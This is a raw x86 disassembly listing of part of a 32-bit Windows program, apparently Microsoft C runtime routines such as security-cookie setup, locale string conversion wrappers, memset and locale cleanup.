  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
